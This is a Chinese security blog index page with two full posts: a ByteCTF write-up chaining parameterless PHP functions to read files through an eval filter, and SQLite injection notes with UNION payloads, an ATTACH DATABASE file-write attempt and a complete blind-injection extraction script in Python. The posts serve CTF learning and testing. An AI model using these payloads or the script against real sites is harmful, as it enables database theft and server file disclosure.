<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="随笔、分享、记录生活">
<meta name="keywords" content="CTF|网络安全|开发">
<meta property="og:type" content="website">
<meta property="og:title" content="Xiao Leung&#39;s Blog">
<meta property="og:url" content="https://www.plasf.cn/page/6/index.html">
<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
<meta property="og:description" content="随笔、分享、记录生活">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
<meta name="twitter:description" content="随笔、分享、记录生活">

<link rel="canonical" href="https://www.plasf.cn/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Xiao Leung's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Xiao Leung's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c8fc5c96.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5c8fc5c96.html" class="post-title-link" itemprop="url">复现ByteCTF-boringcode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-10-07 14:11:33" itemprop="dateCreated datePublished" datetime="2019-10-07T14:11:33+08:00">2019-10-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:15:55" itemprop="dateModified" datetime="2020-10-14T17:15:55+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛没做出来，看着大佬的write up复现，思路真的很骚。</p>
<h2 id="Boringcode"><a href="#Boringcode" class="headerlink" title="Boringcode"></a>Boringcode</h2><ul>
<li><strong>源码</strong></li>
</ul>
<pre><code class="php">&lt;?php
function is_valid_url($url) {
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
            return false;
        }
        return true;
    }
    return false;
}

if (isset($_POST[&#39;url&#39;])){
    $url = $_POST[&#39;url&#39;];
    if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);
            if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        } else {
            echo &quot;error: host not allowed&quot;;
        }
    } else {
        echo &quot;error: invalid url&quot;;
    }
}else{
    highlight_file(__FILE__);
}</code></pre>
<h3 id="考点1"><a href="#考点1" class="headerlink" title="考点1"></a>考点1</h3><pre><code class="php"> if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);</code></pre>
<p>这里如果没有<code>is_valid_url($url)</code>是可以使用data伪协议进行绕过，但是<code>is_valid_url($url)</code>对data进行了过滤使用伪协议这条数行不通，但是也学到了data伪协议可以绕过域名的限制。,但是绕过该点要不一个baidu的鸡肋跳转漏洞要不就是买个xxxbaidu.com的域名。</p>
<p>例如：</p>
<pre><code class="php">&lt;?php
$url = $_POST[&#39;url&#39;];
$r = parse_url($url);
if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);
        }

eval($code);
?&gt;</code></pre>
<p>payload:</p>
<pre><code class="php">url=data://baidu.com/plain;base64,cGhwaW5mbygpOw==</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704299387377.png" alt="img"></p>
<hr>
<h3 id="考点2"><a href="#考点2" class="headerlink" title="考点2"></a>考点2</h3><pre><code class="php">if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }</code></pre>
<p>这里会把函数给替换为空，如果替换结果剩下一个<code>“；”</code>那么就可以绕过这个正则。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704330592656.png" alt="img"></p>
<p>可以观察到，这个正则只会匹配函数为纯字母并且参数为空的payload。也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。那就是说让我们构造多个空参数的函数去读取flag.</p>
<p>我们看如下几个函数：</p>
<pre><code class="php">scandir() 
    var_dump(scandir(&#39;.&#39;));
    array(3) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; } </code></pre>
<p>了一看到<code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用：</p>
<pre><code class="php">end()//读取数组最后一个元素
readfile()//输出一个文件</code></pre>
<p>那么就可以构造如下payload:</p>
<pre><code class="php">readfile(end(scandir(&#39;.&#39;)))</code></pre>
<p>问题又来了，我们不不能够有这个参数那么点又如何构造呢？从大佬的write up中看到两个方法。</p>
<ol>
<li><pre><code class="php">localeconv()
    var_dump(localeconv());
    array(18) { 
        [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; 
        [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; 
        [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot;
        [&quot;currency_symbol&quot;]=&gt; string(0) &quot;&quot; 
        [&quot;mon_decimal_point&quot;]=&gt; string(0) &quot;&quot;
        .......
    } </code></pre>
</li>
</ol>
<p>该函数返回一个当地数字以及货币信息的数组，可以看到返回值第一个就是<code>“.”</code>,而与end()相反的取第一个元素的函数有:</p>
<pre><code class="php">current()       返回数组中的当前单元, 默认取第一个值
pos()           current() 的别名</code></pre>
<p>那么就可以构造如下payload.可以读取到文件本地文件。</p>
<pre><code class="php">readfile(end(scandir(pos(localeconv()))))</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704367249781.png" alt="img"></p>
<p>但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数:</p>
<pre><code class="php">chdir() 函数改变当前的目录。
next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;</code></pre>
<p>那么构造payload,j就可以跳转到上一目录了，大师chidr并不会返回目录列表,而是会返回一个bool值，我们怎么去读取文件呢:</p>
<pre><code class="php">chdir(next(scandir(pos(localeconv()))))</code></pre>
<p>这里可以使用if()语句，也就是当跳转目录成功时候就读取当前文件。构造如下payload:</p>
<pre><code class="php">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</code></pre>
<ol start="2">
<li>当然还有另外的方法，利用当前秒数构造AIISC码再用<code>chr()</code>去转码生成字符。</li>
</ol>
<pre><code class="php">chr(pos(localtime()))</code></pre>
<p>这里出现了一个问题，这个<code>localtime()</code>只接受时间戳，那么这里又出现了其问题如果构造如下payload将无法执行。那么这里还需要不受参数影响的函数，那就<code>time()</code></p>
<pre><code class="php">chr(pos(localtime(chdir(next(scandir(pos(localeconv())))))))</code></pre>
<p>那么可以构造如下payload:</p>
<pre><code class="php">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></pre>
<p>整体构造：</p>
<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></pre>
<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
<pre><code class="php">getchwd() 函数返回当前工作目录。
scandir() 函数返回指定目录中的文件和目录的数组。
dirname() 函数返回路径中的目录部分。
chdir() 函数改变当前的目录。

readfile()  输出一个文件

current()       返回数组中的当前单元, 默认取第一个值
pos()           current() 的别名
next() 函数将内部指针指向数组中的下一个元素，并输出。
end()       将内部指针指向数组中的最后一个元素，并输出。
array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。

chr() 函数从指定的 ASCII 值返回字符。
hex2bin — 转换十六进制字符串为二进制字符串

getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</code></pre>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a herf="https://xz.aliyun.com/t/6316#toc-9">ByteCTF一道题的分析与学习PHP无参数函数的利用</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5d15ec4e7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5d15ec4e7.html" class="post-title-link" itemprop="url">sqlite注入以及PHP使用sqlite笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-10-04 11:17:45" itemprop="dateCreated datePublished" datetime="2019-10-04T11:17:45+08:00">2019-10-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:19:26" itemprop="dateModified" datetime="2020-10-14T17:19:26+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前比赛被sqlite注入坑了，网上能找到的资料比较少，不过已经足够了，在此做一下笔记。</p>
<h3 id="PHP使用SQLITE"><a href="#PHP使用SQLITE" class="headerlink" title="PHP使用SQLITE"></a>PHP使用SQLITE</h3><ul>
<li><strong>连接数据库</strong></li>
</ul>
<p>PHP中自带处理sqlite的类，要使用直接继承SQLite3类然后重写构造方法<code>__construct()</code>指定db文件</p>
<pre><code class="php">class MyDB extends SQLite3
   {
      function __construct()
      {
         $this-&gt;open(&#39;test.db&#39;);
      }
   }</code></pre>
<p>实例化类，判断是否连接成功</p>
<pre><code class="php">$db = new MyDB();
   if(!$db){
      echo $db-&gt;lastErrorMsg();
   } else {
      echo &quot;Opened database successfully\n&quot;;
   }</code></pre>
<ul>
<li>执行SQL语句，以查询为例，其他与mysql无异。</li>
</ul>
<pre><code class="php">$sql =&lt;&lt;&lt;EOF
      SELECT * from hex where id = &#39;$id&#39;;
EOF;
$result = $db-&gt;query($sql);
$data = $result-&gt;fetchArray(SQLITE3_ASSOC);
echo $data[&#39;hex&#39;];</code></pre>
<h3 id="SQLITE的注入"><a href="#SQLITE的注入" class="headerlink" title="SQLITE的注入"></a>SQLITE的注入</h3><h5 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h5><ul>
<li>sqlite3和mysql5.5以后一样存在一个表记录了数据库和表的信息。</li>
</ul>
<p><img src="C:%5CUsers%5C51763%5CDesktop%5C894761-20160811111720934-461357319.png" alt="894761-20160811111720934-461357319"></p>
<ul>
<li>可以看到记录了表名，表结构，那么我们就可以直接通过这个隐藏表来查询sqlite数据库里面的表名。</li>
</ul>
<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(name)from sqlite_master)--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701606229929.png" alt="img"></p>
<ul>
<li>查看表结构<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(sql)from sqlite_master where name=&#39;flag&#39;)--+</code></pre>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701607258796.png" alt="img"></p>
<ul>
<li>查看数据<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(flag)from flag where id=&#39;1&#39;)--+</code></pre>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701608704994.png" alt="img"></p>
<ul>
<li>写文件(实验失败)</li>
</ul>
<pre><code>http://127.0.0.1/?id=1&#39;;ATTACH DATABASE &#39;E:\\phpStudy\\PHPTutorial\\WWW\\xiaozi.php&#39; AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES (&#39; &lt;?php phpinfo(); ?&gt; &#39;); --</code></pre><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>bool盲注：</p>
<ul>
<li><strong>检测表的个数</strong></li>
</ul>
<pre><code class="sqlite">&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=表的个数</code></pre>
<ul>
<li><p>payload解释</p>
<p>COUNT()检测表的个数，用于爆破表个数</p>
</li>
<li><p>自动检测脚本编写</p>
</li>
</ul>
<pre><code class="python">def tables_count(self):
            for i in range(1,255):
                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
                result = self.r.get(payload)
                if result.text == self.contents:
                    print(&#39;Tables count is %d&#39;%(i))</code></pre>
<hr>
<ul>
<li><strong>检测表名长度</strong></li>
</ul>
<pre><code class="python">&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit 第几个表名,1)=长度 --+</code></pre>
<ul>
<li><p>payload解释</p>
<p>LENGTH()用于检测字符串长度，limit限定第一条数据以爆破字符长度</p>
</li>
<li><p>自动检测脚本demo</p>
</li>
</ul>
<pre><code class="python">def table_name_len(self,count):
            for j in range(0,count):
                for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))</code></pre>
<ul>
<li><strong>爆表名</strong></li>
</ul>
<pre><code class="sqlite">?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1)=&#39;f&#39; --+
或者
?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1) like &#39;a&#39; --+</code></pre>
<ul>
<li>payload解释</li>
</ul>
<pre><code class="sqlite">substr((payload),第几位,步长)
例如:
substr((payload),1,1)=&#39;f&#39; --判断第一位字符是不是f</code></pre>
<ul>
<li>自动脚本编写</li>
</ul>
<pre><code class="python">def table_name(self,count,num):
            tablename = &#39;&#39;
            for j in range(count):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablename = tablename +str(chr(i))
            self.table_structure(tablename)
            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))</code></pre>
<ul>
<li><p><strong>爆表结构</strong></p>
<p>爆表结构也就是爆sqlite_master的sql字段，与爆表名类似</p>
</li>
<li><p>自动脚本编写</p>
<pre><code class="python">def table_structure(self,tablename):
          tablecolums = &#39;&#39;
          for i in range(1,255):
                  payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
                  result = self.r.get(payload)
                  if result.text == self.contents:
                      len_sql=i
          for j in range(len_sql+1):
              for i in range(40,125):
                  payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
                  result=self.r.get(payload)
                  if result.text == self.contents:
                      tablecolums = tablecolums +str(chr(i))
          print(tablecolums)            </code></pre>
</li>
<li><p>爆数据</p>
<p>爆数据也就是得知表结构之后，直接爆破对应的表名和表字段。</p>
</li>
</ul>
<pre><code class="python">def get_data(self,colums,table):
            data=&#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_data=i
                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()

            for j in range(len_data+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        data = data +str(chr(i))
                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
                    else:
                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()
            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)</code></pre>
<ul>
<li>整合脚本：</li>
</ul>
<pre><code class="python">import requests
import sys
class sqlite3inject:
        r =&#39;&#39;
        contents =&#39;&#39;
        url =&#39;&#39;
        HEADER = &#39;\033[95m&#39;
        OKBLUE = &#39;\033[94m&#39;
        OKGREEN = &#39;\033[92m&#39;
        WARNING = &#39;\033[93m&#39;
        FAIL = &#39;\033[91m&#39;
        ENDC = &#39;\033[0m&#39;        
        def __init__(self,url):
            self.url = url
            self.r = requests.session()
            self.contents = (self.r.get(self.url)).text

        def get_data(self,colums,table):
            data=&#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_data=i
                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()

            for j in range(len_data+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        data = data +str(chr(i))
                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
                    else:
                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()
            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)

        def table_structure(self,tablename):
            tablecolums = &#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_sql=i
            for j in range(len_sql+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablecolums = tablecolums +str(chr(i))
            print(tablecolums)            
        def table_name(self,count,num):
            tablename = &#39;&#39;
            for j in range(count):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablename = tablename +str(chr(i))
            self.table_structure(tablename)
            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))

        def table_name_len(self,count):
            for j in range(0,count):
                for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))
                        self.table_name(i+1,j)


        def tables_count(self):
            for i in range(1,255):
                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
                result = self.r.get(payload)
                if result.text == self.contents:
                    print(&#39;Tables count is %d&#39;%(i))
                    return self.table_name_len(i)

inject = sqlite3inject(&#39;http://127.0.0.1/?id=1&#39;)        
inject.tables_count()</code></pre>
<ul>
<li>测试效果</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701919083104.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d386e3624.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d386e3624.html" class="post-title-link" itemprop="url">极路由开启SSH并按照python笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-27 13:26:23" itemprop="dateCreated datePublished" datetime="2019-09-27T13:26:23+08:00">2019-09-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:19:48" itemprop="dateModified" datetime="2020-10-14T17:19:48+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IoT安全/" itemprop="url" rel="index"><span itemprop="name">IoT安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
